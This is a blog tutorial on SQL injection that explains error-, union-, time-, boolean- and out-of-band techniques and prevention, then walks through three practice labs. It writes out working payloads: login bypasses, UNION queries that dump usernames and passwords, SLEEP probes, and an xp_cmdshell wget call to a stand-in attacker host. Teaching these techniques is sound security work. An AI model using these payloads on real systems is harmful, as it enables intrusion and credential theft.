---
title: "Web Security Vulnerabilities - SQL Injection"
classes: wide
header:
  teaser: /assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/SQL-Injection-Cover.png
ribbon: green
description: "SQL Injection, also known as SQLI, is a web security vulnerability that allows an attacker to inject malicious queries to manipulate a database. This can result in unauthorized access to sensitive data that should not be available to unauthorized users."
categories:
  - Tutorials
toc: true
---


<!-- ## Table of Contents
  - [What is SQL Injection?](#what-is-sql-injection)
  - [Types of SQL Injection](#types-of-sql-injection)
    - [In-band](#in-band)
      - [Error-based SQLI](#error-based-sqli)
      - [Union-based SQLI](#union-based-sqli)
    - [Blind](#blind)
      - [Time-based SQLI](#time-based-sqli)
      - [Boolean SQLI](#boolean-sqli)
    - [Out-of-band SQLI](#out-of-band-sqli)
  - [What is the Impact of SQLI?](#what-is-the-impact-of-sqli)
  - [How to Find SQLI?](#how-to-find-sqli)
    - [Manual](#manual)
    - [Automation](#automation)
  - [How to Prevent SQLI?](#how-to-prevent-sqli)
  - [Time to Practice](#time-to-practice)
    - [Challenge #1](#challenge-1)
    - [Challenge #2](#challenge-2)
    - [Challenge #3](#challenge-3)
  - [Resources](#resources)
  - [Conclusion](#conclusion) -->

## What is SQL Injection

Before diving into SQL Injection vulnerabilities, let's take a quick look at what SQL is.

> SQL (Structured Query Language) is a query language used to manage and store data in relational databases. It allows you to access, modify, delete, or add data to a database.

> A typical SQL query looks like:
>
> `select username, password from users where database='DB_APP'`
>
> This query retrieves the `username` and `password` from a table called `users` in a database named `DB_APP`.

So, what is SQL Injection?

SQL Injection, also known as SQLI, is a web security vulnerability that allows an attacker to inject malicious queries to manipulate a database. This can result in unauthorized access to sensitive data that should not be available to unauthorized users.

SQL Injection occurs when an application fails to properly validate user input before using it in database queries.

**EX:**

Assume an application checks a username and password during login using the following query:

```sql
select * from users where username='$user' and password='$password';
```

If the application takes the username and password from user input without filtration or sanitization, an attacker can inject a malicious query like `OR 1=1`, which always evaluates to true, thereby bypassing authentication.

## Types of SQL Injection
- ### **In-band** 
  - Error-based SQLI
  - Union-based SQLI

- ### **Blind (Inferential)**
  - Time-based SQLI
  - Boolean SQLI

- ### **Out-of-band SQLI**

### In-band

#### Error-based SQLI

Error-based SQL Injection occurs when an attacker manipulates user input to inject a malicious query, causing the server to return an error message. These error messages can reveal information about the database schema.

**Example:** 

Assume we have a school application where the student's ID is used in the following URL:

```
http://example.com/classes?stuID=5
```

If an attacker injects a single quote (`'`), the query becomes:

The query in the database looks like this:

```
SELECT * FROM class where stuID=5;
```

If an attacker injects a single quote (`'`), the query becomes:

```sql
SELECT * FROM class where stuID=5';
```

This causes a syntax error in SQL. The error message may reveal details about the database structure, such as table or column names, which can help the attacker perform further attacks.

#### Union-based SQLI

Union-based SQL Injection allows attackers to retrieve data by combining their injected query with the original query using the `UNION` operator. The `UNION` statement allows you to combine two or more `SELECT` statements into a single result.

**Example:**

In the previous example, assume an attacker has confirmed there is a SQL Injection vulnerability and wants to leak more information from database, so they can use a Union-based SQL Injection attack.

An attacker can use the `UNION` SQL operator to return the number of columns from the `class` table or another one using a query like this: 

```SQL
SELECT * FROM class where stuID=5' union select username, password from users --
```

The URL will look like the following:

`http://example.com/classes?stuID=5' union select username, password from users --`, 

If successful, the server will display data from both the `class` table and the `users` table, potentially revealing sensitive information like usernames and passwords.

### Blind

#### Time-based SQLI

In a time-based SQL Injection attack, the attacker sends a query that causes the database to delay its response. The delay confirms the vulnerability.

**Example:**

Assume we have a hotel application with a list of rooms and the the application uses the following URL to check room's ID:

`http://example.com/rooms/?roomID=4`

The query in the database looks like this:

```sql
SELECT * FROM rooms where roomID=5
```

An attacker wants to check if there is  SQL Injection vulnerability in the application, so he can use time-based SQL Injection technique using query like this:

```sql
' OR SLEEP(5) --
```

And the query will be like this:

```sql
SELECT * FROM rooms where roomID=5' OR SLEEP(5) --
```

If the application responds with a delay (**5** seconds), it confirms the vulnerability. The attacker can then use this technique to extract information from the database by crafting different time-based payloads and observing the application's response times.

#### Boolean SQLI

Boolean-based SQL Injection relies on queries that return different results depending on whether a condition evaluates to true or false. Attackers use this method to infer whether specific data exists in the database.

**Example:**

Assume that we have a vulnerable login form that uses the following query to check the username and password:

```sql
SELECT * FROM users WHERE username = 'test' AND password = 'test'
```

An attacker wants to check if there is a user called`admin` or not, so he can use Boolean SQL Injection technique using a Boolean-based query like this:

```sql
' OR username='admin' --
```

This will make the query evaluate to:

```sql
SELECT * FROM users WHERE username = '' OR username='admin' --' AND password = 'input_password
```

If the application responds differently (e.g., a successful login vs. an error message) depending on whether the injected condition is true or false, the attacker can deduce that the username `admin` exists in the database.

### Out-of-band SQLI

Out-of-band SQL injection is a type of SQL injection attack where the attacker is able to retrieve data from the database using a different channel or method than the one used to inject the malicious SQL code. Unlike traditional SQL injection attacks, which rely on the application's response to the injected SQL code, out-of-band SQL injection attacks typically exploit vulnerabilities that allow the attacker to communicate with an external server or service.

**EX:**

consider a vulnerable application that uses a Microsoft SQL Server database and allows file uploads. The application may have a feature that allows users to upload a profile picture, which is then stored in the database. The application may use a query like the following to retrieve the profile picture for a user:

```sql
SELECT picture_data FROM user_profile WHERE user_id = '123';
```

If the application is vulnerable, an attacker could inject a payload like this:

```sql
'; EXEC xp_cmdshell 'wget http://attacker-server.com/evil-file.txt -O C:\temp\evil-file.txt'; --
```

This payload uses the `xp_cmdshell` stored procedure in Microsoft SQL Server to execute a command that downloads a file from the attacker's server. The attacker can retrieve the file from their own server without the response containing the file's contents, exploiting out-of-band communication.

## What is the impact of SQLI

SQL Injection vulnerabilities can have severe consequences including:

1. unauthorized access to sensitive data like passwords, default credentials.
2. Attackers can modify or delete data  from the database, resulting in permanent loss of valuable records unless backups are in place.
3. **RCE:** attackers can exploit SQL Injection vulnerabilities to execute operating system commands on the server hosting the database, leading to complete system compromise.

## How to find SQLI

### Manual

To find SQL Injection vulnerabilities manually, you can inject various payloads into user inputs:

- Inject a single quote (`'`) or double quote (`"`). If the application displays an error or returns unexpected results, it may indicate a vulnerability.
- Use Boolean conditions like `OR 1=1` and observe any differences in the application's responses.
- SQL comments (like `--` or `#`) can be used to check if the application is vulnerable.
- Use the `UNION` operator to retrieve data from other tables. The goal is to combine the results of the original query with injected queries.
- Inject payloads that cause the database to pause execution using commands like `SLEEP()` in MySQL or `WAITFOR DELAY` in SQL Server.
- Inject queries designed to trigger errors and extract information from error messages.

### Automation

- Tools like [SQLMap](https://github.com/sqlmapproject/sqlmapi) or [ghauri](https://github.com/r0oth3x49/ghauri) can automate SQL Injection testing.

> `Ghauri` is an advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws.

## How to prevent SQLI

- **Parameterized Queries**

  treat user input as data rather than part of the SQL query itself. This means that when you use a parameterized query, the input is safely passed to the database as a parameter, rather than being directly inserted into the query string. This separation helps to prevent SQL injection attacks, where malicious input is designed to alter the structure of a query.

  **Examples:**

  **1. PHP (MySQLi)**:

  ```php
  code$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
  $stmt->bind_param("ss", $username, $password);
  $stmt->execute();
  ```

  **2. Python (SQLite)**:

  ```python
  cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
  ```

- **Escaping in user input**

  ensures that special characters (e.g., `'`, `"`, `\`) in user input are properly treated as literal values rather than part of the SQL query.

- **Whitelisting permitted input values**

  Implement a whitelist on user input values to ensure that only expected and safe values are accepted.

- **Input Validation**

  Never trust user input, always perform validation and sanitation on input from untrusted sources.

- **Use WAF**

  Use WAF (ex: cloudflare, Akamai) to monitor and filter unintended HTTP requests.

## Time to practice

Now let's solve some labs to practice on SQL Injection.

### Challenge #1

In this challenge, you encounter a login form. Y    our goal is to break into the admin dashboard.

![Challenge_intro](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_1/Challenge_intro.png)

The first thing to try is default credentials like: `admin:admin`, `admin:password` and so on. But all of them not working.

![Challenge_try](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_1/Challenge_try.png)

So, let's intercept the request to burp and try to add single quote `'` in username.

We can see that the response returned an error related to SQL query.

![Challenge_test](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_1/Challenge_test.png)

As we don't have source code of an application, we can assume that SQL query looks like this:

`select * from users where username='$username' AND password = '$password'`

So, how we can exploit it?

we can exploit this query using: `' OR 1=1 #`.

`'` to close the `username` variable and make it empty (which is likely false).

`OR 1=1` which always true.

`#` This is a comment symbol in SQL, causing the rest of the query to be ignored.

So, the final query will be look like this:

`select * from users where username='' OR 1=1 #' AND password = '$password'`

![Challenge_exploit_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_1/Challenge_exploit_1.png)

![Challenge_exploit_1.1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_1/Challenge_exploit_1.1.png)

### Challenge #2

We can see that there is a product search page in the second challenge.

![Challenge_intro](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_intro.png)

So if we type random text, it shows us `No results found`.

![Challenge_try_2.2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_try_2.2.png)

If we check the source code of page, we can see a comment tells us that products available is `adidas`, `Nike`.

![Challegne_source_code](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challegne_source_code.png)

Let's search for them and see the results.

![Challenge_try](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_try.png)

Now let's intercept the request to burp as usual and try to break it using single quote `'`.

Like previous challenge the response contains SQL error which indicates to `SQL Injection`.

![Challenge_test_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_test_1.png)

As we know no source code, so let's try to guess the query. It may be looks like:

`select * from products where product_name="$product_name"`

Let's try to break it using the previous query in first challenge.

we can see it shows us all products info.

![Challenge_try_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_try_2.png)

![Challenge_try_2.1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_try_2.1.png)

So, how we can exploit it?

We don't have login form, so our goal not to access admin page. wee need to access database to raise the impact of the vulnerability.

But, how we can do that?

Let the fun begin.

First thing we need to do is to know the number of columns in the current table. We can do so using: 

`' order by $number_of_colums`.

We can see if we type `10`, it gives us an error. So we can decrease the number of columns until we get the right response.

![Challenge_test_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_test_2.png)

So, we know the number of columns (which is `4`), now we need to know what is the vulnerable columns to extract data.

![Challenge_test_3](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_test_3.png)

We can se column `2`,`3`,`4` is vulnerable, so let's extract database name and version using: `database()` and `version()` in vulnerable columns.

![Challenge_test_4](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_test_4.png)

We can see the database called `sqlinjection` and the version is `10.4.32-MariaDB`. Now let's extract tables from this database using: `select 1,table_name,3,4 from information_schema.tables -- -`

![Challenge_test_5](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_test_5.png)

The above query extract all tables from database, but to be more easy to collect, we can use `group_concat()` to collect all tables in one time.

![Challenge_test_6](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_test_6.png)

We have a lot of tables, so we can search for interesting tables like `users` and we will find it.

Now let's extract all columns from `users` table using:

`adidas' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users' -- -`

![Challenge_exploit_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_exploit_1.png)

We can see above there is `username` and `password` columns which is interesting. So let's extract data from these columns using:

`adidas' union select 1,group_concat(username,':',password),3,4 from users -- -`

Finally we have admin credentials, that we can use in the first challenge.

![Challenge_exploit_1.1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_2/Challenge_exploit_1.1.png)

### Challenge #3

Let's look at third challenge. We can see that wee need send the request with `GET` parameter called `id`.

![Challenge_intro_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_3/Challenge_intro_2.png)

If we send the request with `id=1`, we can see it returns the username.

![Challenge_intro](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_3/Challenge_intro.png)

Let's intercept the request to repeater and try to break it using `'`.

![Challenge_test](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_3/Challenge_test.png)

We can see above that the application response contains SQL error which may indicates to `SQL Injection`.

Let's try to send a request with delay `10` seconds using `1' AND (IF1=1, SLEEP(10), 0) -- -`.

![Challenge_exploit](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_3/Challenge_exploit.png)

If we look at screenshot above, we can see the time that request takes is `11` seconds.

So what we have two choices:

1. Try to brute force database name, table name and columns.
2. Send request to `SQLMap` and it may could to extract data.

![sqlmap](/assets/images/tutorials/Web_Security_Vulnerabilities/SQLI/Challenge_3/sqlmap.png)

## Resources

- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [Intigriti - SQL Injection](https://www.intigriti.com/hackademy/sql-injection)
- [Cobalt - SQL Injection](https://www.cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli)
- [Tryhackme - SQL Injection Lab](https://tryhackme.com/r/room/sqlilab)
- Bug Bounty Bootcamp book

## Conclusion

In this blog, we've explored some foundational techniques for exploiting SQL Injection vulnerabilities. By understanding how malicious SQL queries can manipulate an application's database, we've seen how attackers can bypass authentication, extract data, and potentially compromise the system. Each challenge provided insight into the mechanics of SQL Injection, from basic query manipulation to more advanced exploitation techniques involving tools like Burp Suite.

Thanks for reading.
